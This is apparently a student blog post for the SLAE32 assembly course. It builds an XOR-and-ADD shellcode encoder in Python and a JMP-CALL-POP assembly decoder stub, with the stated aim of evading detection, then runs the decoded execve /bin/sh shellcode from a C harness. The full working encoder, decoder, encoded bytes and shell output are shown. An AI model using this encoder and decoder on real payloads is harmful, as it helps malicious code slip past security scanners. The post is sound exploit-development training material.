---
title: "SLAE32 - Assignment #4 - Custom Encoder"
tags: ["slae32", "assembly", "shellcode", "exploit-development"]
---

## Introduction

This is the blog post for the 4<sup>th</sup> Assignment of the SLAE32 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=3" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.

The purpose of this assignment is to create a custom encoder (encrypter), which obfuscates the shellcode in order to evade detection. The following operations were used: `XOR` each byte with a static key and `ADD` a constant number.

My code can be found in my Github: <a href="https://github.com/geobour98/slae32" target="_blank">geobour98's Github</a>.

## Encryption

The first thing we want to do is to extract the shellcode from a program that is going to be encrypted. The following `Assembly` program from the course materials calls `execve` syscall, which is used to execute a program, on the executable "/bin/sh".

The whole `Assembly` program is the following:

```nasm
; Filename: execve-stack.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	; PUSH the first null dword 
	xor eax, eax
	push eax

	; PUSH //bin/sh (8 bytes) 
	
	push 0x68732f2f
	
	push 0x6e69622f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
```

In order to extract the shellcode, we first have to compile the `Assembly` code. This process consists of assembling and linking, which are described in previous blog posts. So we will use the bash  script `compile.sh` again.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/4_Custom_encoder$ ./compile execve-stack
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

Now, in order to actually extract the shellcode from the `execve-stack` executable we use the `objdump` one-liner, which displays information from object files as described previously:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/4_Custom_encoder$ objdump -d ./execve-stack | grep '[0-9a-f]:' | grep -v 'file'|cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

After that, paste the extracted shellcode at the `shellcode` variable of the python script `xor-add-encoder.py`, which performs `XOR` operation on each byte of the shellcode with the static key `0xAA` and then adds a constant number, which in our case is `1`. It should be noted that the key of `XOR` must not exist inside the shellcode, because it will lead to a nullbyte (`0x00`).

The whole `Python` script is the following:

```python
#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

add_value = 1

print 'XOR - ADD Encoded shellcode: \n'

for x in bytearray(shellcode):
	# XOR encoding
	y = (x ^ 0xAA) + add_value

	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' % y

print encoded

print encoded2

print 'Shellcode Length: %d\n' % len(bytearray(shellcode))
```

Then we execute the script and get the encrypted shellcode.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/4_Custom_encoder$ ./xor-add-encoder.py 
XOR - ADD Encoded shellcode: 

\x9c\x6b\xfb\xc3\x86\x86\xda\xc3\xc3\x86\xc9\xc4\xc5\x24\x4a\xfb\x24\x49\xfa\x24\x4c\x1b\xa2\x68\x2b
0x9c,0x6b,0xfb,0xc3,0x86,0x86,0xda,0xc3,0xc3,0x86,0xc9,0xc4,0xc5,0x24,0x4a,0xfb,0x24,0x49,0xfa,0x24,0x4c,0x1b,0xa2,0x68,0x2b,
Shellcode Length: 25
```

Then, we copy the shellcode in `NASM` format (`0x`) and we will paste it in the `Assembly` program (`xor-decoder-marker.nasm`) for decryption.

## Decryption

The technique that is used to decrypt and execute the shellcode is called `JMP-CALL-POP`. We basically jump to a procedure that performs a `call` instruction on another procedure and this inctruction also pushes the address of the next instruction to the stack, which is the shellcode address. Then the `decode` procedure is repeated until all the bytes of the shellcode are decrypted and the shellcode can now get executed, meaning "/bin/sh" gets executed. In the following explanation, the program is explained through its flow.

With the following instruction we make a short jump to the `call_decoder` procedure:

```nasm
	jmp short call_decoder	; jump short to call_decoder procedure
```

The `call_decoder` procedure is declared and the first instruction calls the `decoder` procedure and pushes the memory address of the next instruction to the stack, which is the shellcode. Then, the encrypted bytes of the shellcode are initialized inside another procedure called `Shellcode`. It's important to note that we add another byte to the encrypted shellcode from the `Python` script because even when we don't know the length of the shellcode, it will be calculated dynamically. This happens because the last byte that we add is the same as the `XOR` key and when the operation happens it will result to a nullbyte. That's where the shellcode stops. In our case the value `1` is added to each byte and in order to retrieve the initial value, `1` has to be subtracted from the byte. So, the `XOR` key is `0xaa` and in `Shellcode` we put `0xab`.

```nasm
call_decoder:

	call decoder
	Shellcode: db 0x9c,0x6b,0xfb,0xc3,0x86,0x86,0xda,0xc3,0xc3,0x86,0xc9,0xc4,0xc5,0x24,0x4a,0xfb,0x24,0x49,0xfa,0x24,0x4c,0x1b,0xa2,0x68,0x2b,0xab				; encrypted shellcode with 0xab at the end (key + 1)
```

Then we go to the `decoder` procedure, where the memory address of shellcode is saved at `ESI` register.

```nasm
decoder: 
	pop esi			; pop memory address pointing at shellcode from the stack
```

After that, there is the `decode` procedure. We first subtract `1` from the value of the `ESI` register, so each byte can be XORed with the key and result to the initial value. Then, the actual `XOR` happens between the new value of the `ESI` register and the static key `0xAA`. The next conditional jump checks if the result from the previous `XOR` operation is `0`, meaning the last byte of the shellcode got decrypted. If so, the shellcode gets executed. Otherwise, `ESI` is incremented by 1 to go to the next byte. Finally, the next byte gets decrypted by a short jump at `decode`.

```nasm
decode:
	sub byte [esi], 0x1	; subtract 1 out of each byte
	xor byte [esi], 0xAA	; xor the subtracted value with the key to retrieve initial value
	jz Shellcode		; jump if 0 (when the shellcode is decrypted)
	inc esi			; increment esi to go to next byte

	jmp short decode	; jump short to decode procedure to continue decrypting
```

The whole `Assembly` program is the following:

```nasm
global _start			

section .text
_start:

	jmp short call_decoder	; jump short to call_decoder procedure

decoder: 
	pop esi			; pop memory address pointing at shellcode from the stack

decode:
	sub byte [esi], 0x1	; subtract 1 out of each byte
	xor byte [esi], 0xAA	; xor the subtracted value with the key to retrieve initial value
	jz Shellcode		; jump if 0 (when the shellcode is decrypted)
	inc esi			; increment esi to go to next byte

	jmp short decode	; jump short to decode procedure to continue decrypting

call_decoder:

	call decoder
	Shellcode: db 0x9c,0x6b,0xfb,0xc3,0x86,0x86,0xda,0xc3,0xc3,0x86,0xc9,0xc4,0xc5,0x24,0x4a,0xfb,0x24,0x49,0xfa,0x24,0x4c,0x1b,0xa2,0x68,0x2b,0xab				; encrypted shellcode with 0xab at the end (key + 1)
```

## Compilation and Testing 

Now we need to compile `xor-decoder-marker.nasm` with the bash script `compile.sh` and extract the shellcode from the generated executable with the `objdump` one-liner.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/4_Custom_encoder$ ./compile.sh xor-decoder-marker
[+] Assembling with Nasm ...
[+] Linking ...
[+] Done!
```

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/4_Custom_encoder$ objdump -d ./xor-decoder-marker | grep '[0-9a-f]:' | grep -v 'file'|cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\xeb\x0c\x5e\x80\x2e\x01\x80\x36\xaa\x74\x08\x46\xeb\xf5\xe8\xef\xff\xff\xff\x9c\x6b\xfb\xc3\x86\x86\xda\xc3\xc3\x86\xc9\xc4\xc5\x24\x4a\xfb\x24\x49\xfa\x24\x4c\x1b\xa2\x68\x2b\xab"
```

After that, we modify the `C` program with the shellcode from `objdump`, which was provided in the course materials and checks if a shellcode is working.

The whole `C` program is the following:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x0c\x5e\x80\x2e\x01\x80\x36\xaa\x74\x08\x46\xeb\xf5\xe8\xef\xff\xff\xff\x9c\x6b\xfb\xc3\x86\x86\xda\xc3\xc3\x86\xc9\xc4\xc5\x24\x4a\xfb\x24\x49\xfa\x24\x4c\x1b\xa2\x68\x2b\xab";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Now we need to compile the `C` program, by disabling the stack protection as well as making the stack executable:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/4_Custom_encoder$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

We test it by just executing `shellcode`.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/4_Custom_encoder$ ./shellcode 
Shellcode Length:  45
$ id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ ls
compile.sh    execve-stack.nasm  shellcode    xor-add-encoder.py  xor-decoder-marker.nasm
execve-stack  execve-stack.o	 shellcode.c  xor-decoder-marker  xor-decoder-marker.o
$ exit
```

## Summary

Both the encoder and decoder (encrypter/decrypter) work and we can successfully decrypt the shellcode at runtime and execute it to get a "/bin/sh" shell.

Next will be the Analysis of shellcode samples generated by `msfvenom` (~~msfpayload~~)!

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **SLAE32 Blog Post**
>
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> 
> https://www.pentesteracademy.com/course?id=3
>
> ~~http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/~~
>
> **Student ID: PA-36167**
{: .prompt-info }
<!-- markdownlint-restore -->
